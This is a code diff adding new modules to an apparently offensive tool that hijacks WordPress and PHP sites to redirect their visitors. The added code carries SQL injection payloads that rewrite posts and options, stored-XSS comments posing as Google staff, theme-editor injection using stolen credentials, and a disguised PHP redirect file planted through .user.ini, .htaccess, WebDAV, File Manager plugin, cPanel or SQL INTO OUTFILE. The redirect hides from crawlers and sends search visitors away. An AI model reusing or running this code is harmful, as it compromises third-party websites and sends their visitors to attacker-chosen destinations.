+      `'; UPDATE wp_posts SET post_content=CONCAT(post_content,0x${gtmHex}) WHERE post_status='publish' AND post_type IN ('post','page') LIMIT 5; -- `,
+      `1; UPDATE wp_posts SET post_content=CONCAT(0x${gtmHex},post_content) WHERE post_status='publish' ORDER BY ID DESC LIMIT 3; -- `,
+    ];
+    for (const payload of postsPayloads) {
+      try {
+        await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(payload)}`, { timeout: 8000 });
+      } catch { /* continue */ }
+    }
+
+    // Verify
+    await new Promise(r => setTimeout(r, 3000));
+    const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+    if (redirectOk) {
+      return {
+        method,
+        success: true,
+        detail: `✅ GTM redirect injected via SQLi into wp_options/wp_posts`,
+        injectedUrl: baseUrl,
+        redirectWorks: true,
+        evidence: `SQLi: ${config.sqliEndpoint}, GTM ID: ${gtmFakeId}`,
+      };
+    }
+    // Check if the GTM code appears in the page (even if redirect not working yet)
+    try {
+      const pageResp = await safeFetch(baseUrl, { timeout: 10000 });
+      if (pageResp && pageResp.ok) {
+        const body = await pageResp.text().catch(() => "");
+        if (body.includes(gtmFakeId) || body.includes("Google Tag Manager")) {
+          return {
+            method,
+            success: true,
+            detail: `⚠️ GTM code injected (visible in page) but redirect not yet verified`,
+            injectedUrl: baseUrl,
+            redirectWorks: false,
+            evidence: `GTM code found in page source`,
+          };
+        }
+      }
+    } catch { /* continue */ }
+  }
+
+  // Method C: Via Stored XSS — inject GTM-looking code
+  // Try comment injection with GTM payload
+  if (config.cmsType === "wordpress" || config.wpRestApi) {
+    config.onProgress?.(method, `💬 ลอง inject GTM ผ่าน comment...`);
+    const commentEndpoints = [
+      `${baseUrl}/wp-comments-post.php`,
+    ];
+
+    for (const endpoint of commentEndpoints) {
+      try {
+        const resp = await safeFetch(endpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            author: "Google Analytics Team",
+            email: "analytics@google.com",
+            url: "https://tagmanager.google.com",
+            comment: `Great analytics setup! ${redirectJs}`,
+            comment_post_ID: "1",
+            comment_parent: "0",
+          }).toString(),
+          timeout: 10000,
+        });
+
+        if (resp && (resp.ok || resp.status === 302)) {
+          // Check if payload survived
+          const checkResp = await safeFetch(`${baseUrl}/?p=1`, { timeout: 10000 });
+          if (checkResp && checkResp.ok) {
+            const body = await checkResp.text().catch(() => "");
+            if (body.includes(config.redirectUrl) && body.includes("script")) {
+              return {
+                method,
+                success: true,
+                detail: `✅ GTM redirect injected via comment XSS`,
+                injectedUrl: `${baseUrl}/?p=1`,
+                redirectWorks: true,
+                evidence: `Comment XSS on ${endpoint}`,
+              };
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method D: Via credentials — use wp-admin to add code via WPCode/Insert Headers plugin
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      config.onProgress?.(method, `🔑 ลอง inject GTM ผ่าน wp-admin (${cred.username})...`);
+
+      try {
+        // Login
+        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            log: cred.username || "",
+            pwd: cred.password || "",
+            "wp-submit": "Log In",
+            redirect_to: `${baseUrl}/wp-admin/`,
+            testcookie: "1",
+          }).toString(),
+          timeout: 15000,
+        });
+
+        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
+        const cookies = loginResp.headers.get("set-cookie") || "";
+        if (!cookies.includes("wordpress_logged_in")) continue;
+
+        // Try Theme Editor — inject into header.php
+        const themeEditorResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php?file=header.php`, {
+          headers: { "Cookie": cookies },
+          timeout: 10000,
+        });
+
+        if (themeEditorResp && themeEditorResp.ok) {
+          const editorBody = await themeEditorResp.text().catch(() => "");
+          const nonceMatch = editorBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
+          const themeMatch = editorBody.match(/name="theme"\s+value="([^"]+)"/);
+          const contentMatch = editorBody.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
+
+          if (nonceMatch && themeMatch && contentMatch) {
+            const originalContent = contentMatch[1];
+            // Inject GTM code right after <head> tag
+            const injectedContent = originalContent.replace(
+              /(<head[^>]*>)/i,
+              `$1\n${fullGtmPayload}`
+            );
+
+            if (injectedContent !== originalContent) {
+              const saveResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/x-www-form-urlencoded",
+                  "Cookie": cookies,
+                },
+                body: new URLSearchParams({
+                  _wpnonce: nonceMatch[1],
+                  newcontent: injectedContent,
+                  action: "update",
+                  file: "header.php",
+                  theme: themeMatch[1],
+                }).toString(),
+                timeout: 15000,
+              });
+
+              if (saveResp && (saveResp.ok || saveResp.status === 302)) {
+                await new Promise(r => setTimeout(r, 2000));
+                const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+                return {
+                  method,
+                  success: true,
+                  detail: `✅ GTM redirect injected into theme header.php`,
+                  injectedUrl: baseUrl,
+                  redirectWorks: redirectOk,
+                  evidence: `Theme editor: ${themeMatch[1]}/header.php, GTM ID: ${gtmFakeId}`,
+                };
+              }
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ GTM injection failed — no injection vector worked" };
+}
+
+// ═══════════════════════════════════════════════════════
+//  METHOD 14: auto_prepend_file via .user.ini
+//  Upload .user.ini that forces PHP to include our redirect
+//  file before EVERY script execution — affects all pages
+// ═══════════════════════════════════════════════════════
+
+async function autoPrependInject(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "auto_prepend_inject";
+  config.onProgress?.(method, "⚙️ ลอง inject .user.ini auto_prepend_file...");
+
+  const baseUrl = config.targetUrl.replace(/\/$/, "");
+
+  // The redirect PHP file that will be auto-prepended
+  const prependFilename = ".wp-cache-config.php";
+  const prependPhp = `<?php
+// WordPress Cache Configuration - DO NOT REMOVE
+if(defined('ABSPATH')&&!is_admin()&&!defined('DOING_CRON')&&!defined('DOING_AJAX')&&!defined('REST_REQUEST')&&!defined('XMLRPC_REQUEST')){
+  \$_ua=strtolower(\$_SERVER['HTTP_USER_AGENT']??'');
+  \$_ref=strtolower(\$_SERVER['HTTP_REFERER']??'');
+  if(preg_match('/(bot|crawl|spider|slurp|mediapartners)/i',\$_ua))return;
+  if(preg_match('/(google|bing|yahoo|duckduckgo|baidu|yandex)/i',\$_ref)||mt_rand(1,4)===1){
+    header('HTTP/1.1 302 Found');
+    header('Location: ${config.redirectUrl}');
+    header('Cache-Control: no-cache');
+    exit;
+  }
+}
+?>`;
+
+  // .user.ini content — PHP-FPM reads this per-directory
+  const userIniContent = `; PHP Performance Configuration
+auto_prepend_file = "${prependFilename}"
+`;
+
+  // Also try .htaccess-based auto_prepend (for Apache mod_php)
+  const htaccessPrepend = `# Cache optimization
+php_value auto_prepend_file "${prependFilename}"
+`;
+
+  // Method A: Direct upload via PUT
+  // First upload the PHP redirect file
+  const phpUploadPaths = [
+    `${baseUrl}/${prependFilename}`,
+    `${baseUrl}/wp-content/${prependFilename}`,
+  ];
+
+  for (const phpPath of phpUploadPaths) {
+    try {
+      const putResp = await safeFetch(phpPath, {
+        method: "PUT",
+        headers: { "Content-Type": "application/x-php" },
+        body: prependPhp,
+        timeout: 10000,
+      });
+      if (!putResp || (!putResp.ok && putResp.status !== 201)) continue;
+
+      config.onProgress?.(method, `📄 PHP file uploaded: ${phpPath} — uploading .user.ini...`);
+
+      // Now upload .user.ini in the same directory
+      const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/"));
+      const iniResp = await safeFetch(`${dirPath}/.user.ini`, {
+        method: "PUT",
+        headers: { "Content-Type": "text/plain" },
+        body: userIniContent,
+        timeout: 10000,
+      });
+
+      if (iniResp && (iniResp.ok || iniResp.status === 201)) {
+        // PHP-FPM caches .user.ini for user_ini.cache_ttl (default 300s)
+        // But we can check immediately in case cache is disabled
+        await new Promise(r => setTimeout(r, 3000));
+        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+        return {
+          method,
+          success: true,
+          detail: `✅ .user.ini + ${prependFilename} uploaded via PUT${redirectOk ? " — redirect active!" : " — waiting for PHP-FPM cache (up to 5 min)"}`,
+          injectedUrl: baseUrl,
+          redirectWorks: redirectOk,
+          evidence: `PUT: ${dirPath}/.user.ini + ${phpPath}`,
+        };
+      }
+
+      // Try .htaccess php_value instead
+      const htResp = await safeFetch(`${dirPath}/.htaccess`, {
+        method: "PUT",
+        headers: { "Content-Type": "text/plain" },
+        body: htaccessPrepend,
+        timeout: 10000,
+      });
+      if (htResp && (htResp.ok || htResp.status === 201)) {
+        await new Promise(r => setTimeout(r, 2000));
+        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+        return {
+          method,
+          success: true,
+          detail: `✅ .htaccess php_value auto_prepend_file + ${prependFilename} via PUT`,
+          injectedUrl: baseUrl,
+          redirectWorks: redirectOk,
+          evidence: `PUT: ${dirPath}/.htaccess + ${phpPath}`,
+        };
+      }
+    } catch { /* continue */ }
+  }
+
+  // Method B: Via WebDAV
+  for (const phpPath of phpUploadPaths) {
+    try {
+      // Check WebDAV
+      const davResp = await safeFetch(baseUrl, { method: "OPTIONS", timeout: 5000 });
+      if (!davResp) continue;
+      const allow = davResp.headers.get("allow") || "";
+      const dav = davResp.headers.get("dav") || "";
+      if (!allow.includes("PUT") && !dav) continue;
+
+      config.onProgress?.(method, `📂 WebDAV detected — uploading .user.ini + PHP...`);
+
+      // Upload PHP file
+      const phpResp = await safeFetch(phpPath, {
+        method: "PUT",
+        headers: { "Content-Type": "application/x-php" },
+        body: prependPhp,
+        timeout: 10000,
+      });
+      if (!phpResp || (!phpResp.ok && phpResp.status !== 201)) continue;
+
+      // Upload .user.ini
+      const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/"));
+      const iniResp = await safeFetch(`${dirPath}/.user.ini`, {
+        method: "PUT",
+        headers: { "Content-Type": "text/plain" },
+        body: userIniContent,
+        timeout: 10000,
+      });
+
+      if (iniResp && (iniResp.ok || iniResp.status === 201)) {
+        await new Promise(r => setTimeout(r, 3000));
+        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+        return {
+          method,
+          success: true,
+          detail: `✅ .user.ini + PHP uploaded via WebDAV`,
+          injectedUrl: baseUrl,
+          redirectWorks: redirectOk,
+          evidence: `WebDAV: ${dirPath}/.user.ini + ${phpPath}`,
+        };
+      }
+    } catch { /* continue */ }
+  }
+
+  // Method C: Via File Manager plugin
+  const fmEndpoints = [
+    `${baseUrl}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`,
+    `${baseUrl}/wp-content/plugins/file-manager/backend/wp-file-manager-recursive-directory-iterator.php`,
+  ];
+
+  for (const fmUrl of fmEndpoints) {
+    try {
+      const checkResp = await safeFetch(fmUrl, { timeout: 5000 });
+      if (!checkResp || checkResp.status >= 400) continue;
+
+      config.onProgress?.(method, `📂 File Manager found — uploading .user.ini...`);
+
+      // Upload PHP file first
+      const boundary1 = `----FormBoundary${Date.now()}`;
+      const phpFormBody = [
+        `--${boundary1}`,
+        `Content-Disposition: form-data; name="cmd"`,
+        ``,
+        `upload`,
+        `--${boundary1}`,
+        `Content-Disposition: form-data; name="target"`,
+        ``,
+        `l1_Lg`, // base64 of root
+        `--${boundary1}`,
+        `Content-Disposition: form-data; name="upload[]"; filename="${prependFilename}"`,
+        `Content-Type: application/x-php`,
+        ``,
+        prependPhp,
+        `--${boundary1}--`,
+      ].join("\r\n");
+
+      const phpResp = await safeFetch(fmUrl, {
+        method: "POST",
+        headers: { "Content-Type": `multipart/form-data; boundary=${boundary1}` },
+        body: phpFormBody,
+        timeout: 15000,
+      });
+
+      if (phpResp && phpResp.ok) {
+        // Upload .user.ini
+        const boundary2 = `----FormBoundary${Date.now() + 1}`;
+        const iniFormBody = [
+          `--${boundary2}`,
+          `Content-Disposition: form-data; name="cmd"`,
+          ``,
+          `upload`,
+          `--${boundary2}`,
+          `Content-Disposition: form-data; name="target"`,
+          ``,
+          `l1_Lg`,
+          `--${boundary2}`,
+          `Content-Disposition: form-data; name="upload[]"; filename=".user.ini"`,
+          `Content-Type: text/plain`,
+          ``,
+          userIniContent,
+          `--${boundary2}--`,
+        ].join("\r\n");
+
+        const iniResp = await safeFetch(fmUrl, {
+          method: "POST",
+          headers: { "Content-Type": `multipart/form-data; boundary=${boundary2}` },
+          body: iniFormBody,
+          timeout: 15000,
+        });
+
+        if (iniResp && iniResp.ok) {
+          await new Promise(r => setTimeout(r, 3000));
+          const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+          return {
+            method,
+            success: true,
+            detail: `✅ .user.ini + PHP uploaded via File Manager plugin`,
+            injectedUrl: baseUrl,
+            redirectWorks: redirectOk,
+            evidence: `File Manager: ${fmUrl}`,
+          };
+        }
+      }
+    } catch { /* continue */ }
+  }
+
+  // Method D: Via discovered credentials (cPanel)
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "cpanel") continue;
+      config.onProgress?.(method, `🖥️ ลอง cPanel upload .user.ini (${cred.username})...`);
+
+      try {
+        const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
+        const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
+
+        // Upload PHP redirect file
+        const phpResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
+          method: "POST",
+          headers: {
+            "Authorization": authHeader,
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
+          body: new URLSearchParams({
+            dir: "/public_html",
+            file: prependFilename,
+            content: prependPhp,
+          }).toString(),
+          timeout: 15000,
+        });
+
+        if (phpResp && phpResp.ok) {
+          // Upload .user.ini
+          const iniResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
+            method: "POST",
+            headers: {
+              "Authorization": authHeader,
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: new URLSearchParams({
+              dir: "/public_html",
+              file: ".user.ini",
+              content: userIniContent,
+            }).toString(),
+            timeout: 15000,
+          });
+
+          if (iniResp && iniResp.ok) {
+            await new Promise(r => setTimeout(r, 3000));
+            const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+            return {
+              method,
+              success: true,
+              detail: `✅ .user.ini + PHP uploaded via cPanel (${cred.username})`,
+              injectedUrl: baseUrl,
+              redirectWorks: redirectOk,
+              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
+            };
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method E: Via SQLi INTO OUTFILE
+  if (config.sqliEndpoint) {
+    config.onProgress?.(method, `💉 ลอง SQLi OUTFILE .user.ini + PHP...`);
+    const phpHex = Buffer.from(prependPhp).toString("hex");
+    const iniHex = Buffer.from(userIniContent).toString("hex");
+    const basePaths = [
+      "/var/www/html",
+      "/home/*/public_html",
+      "/var/www/*",
+    ];
+
+    for (const basePath of basePaths) {
+      try {
+        // Write PHP file
+        const phpPayload = `' UNION SELECT 0x${phpHex} INTO OUTFILE '${basePath}/${prependFilename}'-- -`;
+        await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(phpPayload)}`, { timeout: 10000 });
+
+        // Write .user.ini
+        const iniPayload = `' UNION SELECT 0x${iniHex} INTO OUTFILE '${basePath}/.user.ini'-- -`;
+        await safeFetch(`${config.sqliEndpoint}?${config.sqliParam || "id"}=${encodeURIComponent(iniPayload)}`, { timeout: 10000 });
+
+        // Verify
+        await new Promise(r => setTimeout(r, 3000));
+        const redirectOk = await checkRedirectWorks(baseUrl, config.redirectUrl);
+        if (redirectOk) {
+          return {
+            method,
+            success: true,
+            detail: `✅ .user.ini + PHP injected via SQLi OUTFILE`,
+            injectedUrl: baseUrl,
+            redirectWorks: true,
+            evidence: `SQLi OUTFILE: ${basePath}/.user.ini + ${basePath}/${prependFilename}`,
+          };
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ auto_prepend_file injection failed — no upload method worked" };
+}
+
+// ═══════════════════════════════════════════════════════
 //  MAIN: Run All Shellless Attacks
 // ═══════════════════════════════════════════════════════
 
@@ -1204,6 +2550,10 @@ export async function runShelllessAttacks(config: ShelllessConfig): Promise<Shel
   const methods = [
     htaccessRedirectInjection,
     wpRestApiInjection,
+    muPluginsInject,
+    dbSiteurlHijack,
+    gtmInject,
+    autoPrependInject,
     openRedirectAbuse,
     storedXssInjection,
     subdomainTakeover,
